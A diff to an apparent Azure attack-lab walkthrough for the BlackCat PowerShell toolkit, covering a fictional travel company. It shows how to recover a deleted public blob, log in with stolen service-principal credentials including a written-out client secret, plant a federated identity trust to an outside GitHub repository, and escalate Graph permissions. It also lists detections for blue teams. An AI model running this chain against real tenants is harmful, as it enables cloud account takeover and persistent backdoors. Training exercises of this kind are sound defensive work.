@@ -196,7 +196,7 @@ Add-EntraApplication -DisplayName "Backdoor-App"
 
 ```
 bluemountaintravelsa (Storage Account)
-├── hr-templates (Blob Container - PUBLIC ACCESS + VERSIONING)
+├── templates (Blob Container - PUBLIC ACCESS + VERSIONING)
 │   └── 🗑️ Onboarding-Welcome-Email.eml    ← DELETED but version exists!
 │                                            Contains SAS token to Azure Files
 ```
@@ -250,7 +250,7 @@ bluemountaintravelsa (Storage Account)
 
 ```powershell
 # Step 1: DNS record discovery
-Find-DnsRecord -Domain "bluemountaintravel.uk"
+Find-DnsRecords -Domains "bluemountaintravel.uk"
 
 # Step 2: Find DNS records for Azure resources
 Find-AzurePublicResource -Name "bluemountaintravel"
@@ -261,10 +261,10 @@ Find-PublicStorageContainer -StorageAccountName "bluemountaintravelsa"
 # Output:
 # StorageAccount         Container      AccessLevel
 # --------------         ---------      -----------
-# bluemountaintravelsa   hr-templates   Blob         <-- Public container!
+# bluemountaintravelsa   templates   Blob         <-- Public container!
 
 # Step 4: List contents - appears empty!
-$publicUrl = "https://bluemountaintravelsa.blob.core.windows.net/hr-templates"
+$publicUrl = "https://bluemountaintravelsa.blob.core.windows.net/templates"
 Get-PublicBlobContent -BlobUrl $publicUrl -ListOnly
 
 # Output: No files found (the email was deleted)
@@ -294,13 +294,16 @@ Get-PublicBlobContent -BlobUrl $publicUrl -OutputPath ./loot -IncludeDeleted
 An `.eml` file is just a text file - open it in any editor or simply display it:
 
 ```powershell
-# Option 1: Display in terminal
+# Option 1: Open in mail client
+Invoke-Item ./loot/Onboarding-Welcome-Email.eml
+
+# Option 2: Display in terminal
 Get-Content ./loot/Onboarding-Welcome-Email.eml
 
-# Option 2: Open in VS Code (demo-friendly!)
+# Option 3: Open in VS Code (demo-friendly!)
 code ./loot/Onboarding-Welcome-Email.eml
 
-# Option 3: Search for any URLs
+# Option 4: Search for any URLs
 Select-String -Path ./loot/*.eml -Pattern "https://"
 ```
 
@@ -492,11 +495,11 @@ flowchart TD
 
 ```powershell
 # Connect using the stolen App Registration credentials
-params = @{
-    ServicePrincipalId = "1950a258-227b-4e31-a9cf-717495945fc2"
-    TenantId = "67f8647a-6555-4c70-bee4-45625d332c3f"
-    ClientSecret = "Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2"
-    SubscriptionId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+$params = @{
+    ServicePrincipalId = "12b684d1-68be-4dc9-90c2-0ab270402124"
+    TenantId = "3da86d62-c862-48da-973f-487ab98166a8"
+    ClientSecret = "eOD8Q~YoI1~hshRyyUJ9x1kNWAAD1csMl.4pvcY4"
+    SubscriptionId = "cc826ab7-e046-4422-8e68-ba57b6d48165"
 }
 
 Connect-ServicePrincipal @params
@@ -539,7 +542,7 @@ Get-ManagedIdentity
 
 ```powershell
 # Check what Graph API permissions the UAMI has
-Get-ServicePrincipalsPermission -ServicePrincipalId "3fa85f64-5717-4562-b3fc-2c963f66afa6"
+Get-ServicePrincipalsPermission -ServicePrincipalId "197e935d-02a7-4ca3-98a2-a2b0ffc389f6"
 
 # Output:
 # DisplayName: uami-hr-cicd-automation
@@ -568,14 +571,11 @@ Get-ServicePrincipalsPermission -ServicePrincipalId "3fa85f64-5717-4562-b3fc-2c9
 
 ```powershell
 # Get any federated identity credentials on the UAMI
-# (Need to query Azure Resource Manager for this)
-$uamiId = "/subscriptions/a1b2c3d4-e5f6-7890-abcd-ef1234567890/resourceGroups/rg-hr-infrastructure/providers/Microsoft.ManagedIdentity/userAssignedIdentities/uami-hr-cicd-automation"
-
-$ficUrl = "https://management.azure.com$uamiId/federatedIdentityCredentials?api-version=2023-01-31"
-$existingFics = Invoke-RestMethod -Uri $ficUrl -Headers $script:authHeader
+Get-FederatedIdentityCredential -Name "uami-hr-cicd-automation"
 
 # Output shows existing GitHub trust:
-#   Name: github-actions-main
+#   Name: uami-hr-cicd-automation
+#   Credential Name : github-actions-main
 #   Subject: repo:blue-mountain-travel/hr-onboarding-portal:ref:refs/heads/main
 #   Issuer: https://token.actions.githubusercontent.com
 
@@ -684,10 +684,10 @@ flowchart LR
 $uamiId = "/subscriptions/a1b2c3d4-e5f6-7890-abcd-ef1234567890/resourceGroups/rg-hr-infrastructure/providers/Microsoft.ManagedIdentity/userAssignedIdentities/uami-hr-cicd-automation"
 
 Set-FederatedIdentity `
-    -Id $uamiId `
+    -ManagedIdentityName "uami-hr-cicd-automation" `
     -Name "github-backup-automation" `
-    -GitHubOrganization "attacker-org" `
-    -GitHubRepository "malicious-repo" `
+    -GitHubOrganization "azurekid" `
+    -GitHubRepository "blackcat" `
     -Branch "main"
 
 # This creates a trust: UAMI now accepts tokens from attacker's GitHub repo
@@ -762,13 +762,9 @@ The UAMI token has `AppRoleAssignment.ReadWrite.All`. This permission can grant 
 # After authenticating with the UAMI token from GitHub Actions,
 # First, use BlackCat's Set-ManagedIdentityPermission to escalate the UAMI's own permissions
 
-# Get the Microsoft Graph service principal ID (needed for granting Graph permissions)
-$graphSp = Invoke-MsGraph -relativeUrl "servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'" -NoBatch
-$graphResourceId = $graphSp.value[0].id
-
 # Grant the UAMI the ability to assign directory roles
 Set-ManagedIdentityPermission `
-    -servicePrincipalId "3fa85f64-5717-4562-b3fc-2c963f66afa6" `
+    -servicePrincipalId "197e935d-02a7-4ca3-98a2-a2b0ffc389f6a" `
     -CommonResource MicrosoftGraph `
     -appRoleName "RoleManagement.ReadWrite.Directory"
 
@@ -855,10 +851,10 @@ $secret = Invoke-RestMethod `
 
 | Detection | Log Source | Alert Priority |
 |-----------|------------|----------------|
-| New App Registration | Entra ID Audit Logs | 🔴 Critical |
-| Global Admin role assignment | Entra ID Audit Logs | 🔴 Critical |
-| Service principal sign-in from new app | Entra ID Sign-in Logs | 🟡 High |
-| Client secret added to application | Entra ID Audit Logs | 🟡 High |
+| New App Registration | Entra ID Audit Logs | Critical |
+| Global Admin role assignment | Entra ID Audit Logs | Critical |
+| Service principal sign-in from new app | Entra ID Sign-in Logs | High |
+| Client secret added to application | Entra ID Audit Logs | High |
 
 ---
 
@@ -955,7 +951,7 @@ AuditLogs
 
 ---
 
-## 🎯 Key Takeaways
+## Key Takeaways
 
 ### For Blue Teams
 
@@ -984,7 +980,7 @@ AuditLogs
 
 ---
 
-## 📋 BlackCat Functions Used
+## BlackCat Functions Used
 
 | Phase | Function | Purpose |
 |-------|----------|---------|
@@ -1001,7 +997,7 @@ AuditLogs
 
 ---
 
-## 📋 Exercise Materials
+## Exercise Materials
 
 | File | Purpose |
 |------|---------|
@@ -1012,7 +1008,7 @@ AuditLogs
 
 ---
 
-## 🏁 Flags
+## Flags
 
 Participants should capture these flags during the exercise:
 
